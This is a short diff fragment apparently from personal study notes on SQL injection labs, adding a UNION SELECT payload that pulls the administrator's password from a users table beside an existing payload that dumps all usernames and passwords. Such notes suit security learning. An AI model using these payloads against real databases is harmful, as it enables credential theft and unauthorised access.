@@ -200,6 +200,8 @@ GIVEN : The database contains a different table called users, with columns calle
       -FIND THE USER & PASSWORD 
       'UNION SELECT NULL,username||'~'||password from users --+
 
+      'UNION SELECT NULL,password FROM USERS WHERE username='administrator' --+
+
 
 
 
